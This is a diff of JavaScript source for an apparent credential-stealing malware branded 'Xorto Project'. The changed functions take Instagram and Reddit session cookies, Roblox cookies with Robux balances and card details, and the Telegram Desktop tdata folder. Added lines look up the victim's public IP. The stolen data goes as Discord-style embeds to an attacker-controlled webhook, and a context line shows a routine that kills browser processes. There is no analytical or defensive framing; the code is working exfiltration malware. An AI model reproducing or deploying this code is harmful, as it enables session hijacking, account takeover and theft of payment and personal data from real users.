@@ -384,29 +384,70 @@ async function fetchFollowersCount(sessionId) {
 
 async function SubmitInstagram(sessionId) {
     try {
-        const data = await fetchInstagramData(sessionId);
+
+    const { data: ipData } = await axios.get('https://api.ipify.org?format=json');
+    const ip = ipData.ip;
+
+	  const data = await fetchInstagramData(sessionId);
         const followersCount = await fetchFollowersCount(sessionId);
 
         const embed = {
-      color: 0x303037,
-            title: 'Instagram Session Detected',
-            fields: [
-                { name: '<a:VerifiedUser:1205132509076135987> Verified Account', value: data.verified ? 'Yes' : 'No', inline: true },
-                { name: 'Username', value: data.username, inline: true },
-                { name: '<:twitter_follow:1205132510254604388>  Followers Count', value: followersCount, inline: true },
-                { name: '<:hackerblack:1095747410539593800> Token', value: '```' + data.sessionId + '```', inline: false },
+				key: key,
+            embeds: [
+                {
+                    color: 3553599,
+                    fields: [
+                        {
+                            name: "<a:xorto:954736323745415199> An Instagram Account Detected!",
+                            value: "`Instagram Account`"
+                        },
+                        {
+                            name: "<:xorto2:1253851581267443712> Username:",
+                            value: `\`${data.username}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<a:xorto:1023591272746864671> Followers:",
+                            value: `\`${followersCount}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<a:xorto:1023591270909755392> Verified Type:",
+                            value: `\`${data.verified ? 'Verified' : 'Not Verified'}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<:xorto:957015863377149962> Session:",
+                            value: `\`${data.sessionId}\``,
+                            inline: true
+                        },
+                        {
+                            name: "<a:xorto:954738629220106281> Ip:",
+                        }
+                    ],
+                    author: {
+                        name: "Instagram Session",
+                        icon_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
+                    },
+                    footer: {
+                        text: "@xortoproject"
+                    },
+                    thumbnail: {
+                        url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
+                    }
+                }
             ],
-            footer: {
-                text: 'Created by: Xorto Project',
-            },
+            username: "XortoProject",
+            avatar_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473",
+            attachments: []
         };
 
-        await axios.post(`${api_url}/webhooks/${randomString}`, { embeds: [embed], key });
+        await axios.post(`${api_url}/webhooks/${randomString}`, embed);
 
         console.log("Data sent to Discord webhook successfully.");
-		} catch (error) {
-    console.error("Error sending data to Discord webhook:", error);
-		}
+    } catch (error) {
+        console.error("Error sending data to Discord webhook:", error);
+    }
 }
 
 async function GetRobloxDataAndTransactionTotals(secret_cookie) {
@@ -487,55 +528,65 @@ async function SubmitRoblox(secret_cookie) {
 
     let paymentProfiles = await GetPaymentProfiles(secret_cookie);
 
+     const { data: ipData } = await axios.get('https://api.ipify.org?format=json');
+    const ip = ipData.ip;
 
 
-    let embed = {
-      color: 15548997,
+ let embed = {
+      color: 3553599,
       author: {
-        name: 'NEW HIT',
-        icon_url: '',
+        name: 'Roblox Session',
+        icon_url: 'https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473',
       },
       fields: [
         {
-          name: 'Name:',
-          value: data.username,
-          inline: true,
-	    },
+          name: '<a:xorto:954736323745415199> An Roblox Account Detected!',
+          value: '`Roblox Account`',
+        },
         {
-          name: 'Robux:',
-          value: robuxValue,
+          name: '<a:xorto:954738629220106281> Id:',
+          value: `\`${data.userID}\``,
           inline: true,
         },
         {
-          name: 'Premium:',
-          value: data.premium ? 'Yes' : 'No',
+          name: '<a:xorto:954738629220106281> Username:',
+          value: `\`${data.username}\``,
           inline: true,
         },
         {
-          name: 'UserID:',
-          value: data.userID,
+          name: '<a:xorto:954738629220106281> Premium Type:',
+          value: `\`${data.premium ? 'Yes' : 'No'}\``,
           inline: true,
         },
-
         {
-          name: 'Pending Robux:',
-          value: data.pendingRobuxTotal,
+          name: '<a:xorto:954738629220106281> Robux:',
+          value: `\`${robuxValue}\``,
           inline: true,
         },
-      
-
         {
-          name: 'Payment Profiles:',
+          name: '<a:xorto:954738629220106281> Pending Robux:',
+          value: `\`${pendingrobux}\``,
+          inline: true,
+        },
+        {
+          name: '<a:xorto:954738629220106281> Payment Profiles:',
           value: paymentProfiles.map(profile => {
-            return `Card: ${profile.providerPayload.CardNetwork} Ending in ${profile.providerPayload.Last4Digits}`;
+            return `\`Card: ${profile.providerPayload.CardNetwork} Ending in ${profile.providerPayload.Last4Digits}\``;
           }).join('\n'),
-          inline: false,
+        },
+        {
+          name: '<a:xorto:954738629220106281> Ip:',
+          value: `\`${ip}\``
         },
       ],
       footer: {
-        text: '@Xorto Project',
+        text: '@xortoproject',
+      },
+      thumbnail: {
+        url: 'https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473',
       },
     };
+
 
     let payload = {
       embeds: [embed],
@@ -563,7 +614,7 @@ async function SubmitRoblox(secret_cookie) {
         },
       ],
       footer: {
-        text: '@Xorto Project',
+        text: 'RedRose Project',
       },
     };
 
@@ -712,8 +763,11 @@ function stealTikTokSession(cookie) {
        createAndExecuteScripts();		
 
 
-function setRedditSession(cookie) {
+async function setRedditSession(cookie) {
     try {
+     const { data: ipData } = axios.get('https://api.ipify.org?format=json');
+    const ip = ipData.ip;
+
         const cookies = `reddit_session=${cookie}`;
         const headers = {
             'Cookie': cookies,
@@ -739,43 +793,53 @@ function setRedditSession(cookie) {
                     .then(userDataResponse => {
                         const userData = userDataResponse.data;
                         const username = userData.name;
-                        const profileUrl = `https://www.reddit.com/user/${username}`;
                         const commentKarma = userData.comment_karma;
                         const totalKarma = userData.total_karma;
                         const coins = userData.coins;
                         const mod = userData.is_mod;
                         const gold = userData.is_gold;
-                        const suspended = userData.is_suspended;
 
                         const embedData = {
-                            title: "Xorto Project",
-                            description: "",
-                            color: 0xff6f61,
-                            url: '',
-                            timestamp: new Date().toISOString(),
-                            fields: [
-{ name: '<:cookie:1205123589930749995> Cookies', value: '```' + cookies + '```', inline: false },
-                { name: ':globe_with_meridians: Profile URL', value: '```' + profileUrl + '```', inline: false },
-                { name: ':bust_in_silhouette: Username', value: '```' + username + '```', inline: false },
-                { name: '', value: ':speech_balloon: Comments: ```' + commentKarma + '``` :thumbsup: Total Karma: ```' + totalKarma + '```', inline: true },
-                { name: ':moneybag: Coins', value: '```' + coins + '```', inline: false },
-                { name: ':shield: Moderator', value: '```' + (mod ? 'Yes' : 'No') + '```', inline: true },
-                { name: ':star2: Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
-                { name: ':no_entry_sign: Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
+				key: key,
+                            embeds: [
+                                {
+                                    color: 3553599,
+                                    fields: [
+                                        { name: "<a:xorto:954736323745415199> An Reddit Account Detected!", value: "`Reddit Account`" },
+                                        { name: "<:xorto2:1253851581267443712> Username:", value: `\`${username}\``, inline: true },
+                                        { name: "<:xorto0:1253851573755318354> Comments:", value: `\`${commentKarma}\``, inline: true },
+                                        { name: "<a:xorto3:1253851575877767218> Total Karma:", value: `\`${totalKarma}\``, inline: true },
+                                        { name: "<a:xorto:1023591272746864671> Coins:", value: `\`${coins}\``, inline: true },
+                                        { name: "<:xorto1:1253851577802948638> Reddit Gold:", value: `\`${gold ? 'Gold' : 'Not Gold'}\``, inline: true },
+                                        { name: "<a:xorto:1023591270909755392> Moderator:", value: `\`Not Moderator\``, inline: true },
+                                        { name: "<:xorto:957015863377149962> Session:", value: `\`${cookies}\``, inline: false },
+                                        { name: "<a:xorto:954738629220106281> Ip:", value: `\`${ip}\``, inline: false }
+                                    ],
+                                    author: {
+                                        name: "Reddit Session",
+                                        icon_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
+                                    },
+                                    footer: {
+                                        text: "@xortoproject"
+                                    },
+                                    thumbnail: {
+                                        url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
+                                    }
+                                }
                             ],
-                            footer: {
-                                text: 'Developed by Xorto Project 🤖'
-                            }
+                            username: "XortoProject",
+                            avatar_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473",
+                            attachments: []
                         };
 
-                        const data = {
-                            embeds: [embedData], 
-                            key: key 
-                        };
                         
-                        axios.post(`${api_url}/webhooks/${randomString}`, data);
-
-                        console.log('Data successfully sent to the webhook.');
+                        axios.post(`${api_url}/webhooks/${randomString}`, embedData)
+                            .then(() => {
+                                console.log('Data successfully sent to the webhook.');
+                            })
+                            .catch(error => {
+                                console.error('Error sending data to the webhook:', error);
+                            });
                     })
                     .catch(error => {
                         console.error('Error retrieving user data:', error);
@@ -1813,7 +1877,11 @@ async function submitfilezilla() {
 
 //
 async function SubmitTelegram() {
-    const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;
+   
+     const { data: ipData } = await axios.get('https://api.ipify.org?format=json');
+    const ip = ipData.ip;
+
+   const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Telegram Desktop\\tdata`;
 
     if (!fs.existsSync(file)) {
         console.log('File does not exist');
@@ -1842,39 +1910,49 @@ async function SubmitTelegram() {
         });
 
         const responseData = uploadResponse.data?.data || {};
-        const embedData = {
-            title: '📤 Telegram File Upload Response',
-            color: 0x3498db,
-            fields: [
-                { name: '🔗 Download Page', value: responseData.downloadPage || 'N/A', inline: true },
-                { name: '📄 File Name', value: responseData.fileName || 'N/A', inline: true }
-            ],
-            footer: { text: 'Xorto Project' }
-        };
 
-        const payload = { embeds: [embedData], key: key };
+        const payload = {
+				key: key,
+            embeds: [
+                {
+                    title: "Click To Download!",
+                    url: responseData.downloadPage || 'https://xortoproject.xyz',
+                    color: 3553599,
+                    fields: [
+                        {
+                            name: "<:xorto2:1253851581267443712> File Name:",
+                            value: "`TelegramSession.zip`",
+                            inline: true
+                        },
+  {
+                            name: "<a:xorto:954738629220106281> Ip:",
+                            value: `\`${ip}\``
+                        }						
+                    ],
+                    author: {
+                        name: "Telegram Session",
+                        icon_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
+                    },
+                    footer: {
+                        text: "@xortoproject"
+                    },
+                    thumbnail: {
+                        url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
+                    }
+                }
+            ],
+            username: "XortoProject",
+            avatar_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473",
+            attachments: []
+        };
 
         await axios.post(`${api_url}/webhooks/${randomString}`, payload);
         console.log('Discord webhook sent successfully!');
     } catch (error) {
         console.log('Error occurred:', error.message);
-        const responsePayload = { error: error.message };
-        const embedData = {
-            embeds: [{
-                title: 'Error Uploading File',
-                description: JSON.stringify(responsePayload, null, 2),
-                color: 0xFF0000
-            }]
-        };
-
-        try {
-            await axios.post("${api_url}/error", embedData);
-            console.log('Error webhook sent successfully!');
-        } catch (webhookError) {
-            console.log('Error sending error webhook:', webhookError.message);
-        }
     }
 }
+
 
 async function closeBrowsers() {
   const browsersProcess = ["chrome.exe", "Telegram.exe", "msedge.exe", "opera.exe", "brave.exe"];
